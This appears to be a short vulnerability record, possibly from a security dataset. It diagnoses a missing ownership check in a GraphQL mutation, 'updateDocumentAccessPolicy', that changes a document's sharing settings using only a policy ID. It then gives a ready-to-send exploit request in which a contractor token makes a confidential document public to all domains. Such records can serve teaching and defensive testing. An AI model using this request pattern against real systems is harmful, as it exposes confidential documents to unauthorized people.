diagnosis: The subgraph mutation updateDocumentAccessPolicy updates document security classification and public sharing settings solely by policyId without validating that context.user is the document owner or tenant administrator. An attacker can set confidential internal board minutes or patents to public by altering their access policies.
exploit_request:
POST /graphql HTTP/1.1
Host: doc-subgraph.enterprise.io
Authorization: Bearer <external_contractor_jwt>
Content-Type: application/json

{"query": "mutation { updateDocumentAccessPolicy(policyId: \"65a1209b109e20a104f98101\", isPublic: true, allowedDomain: \"*\") { policyId isPublic allowedDomain } }"}
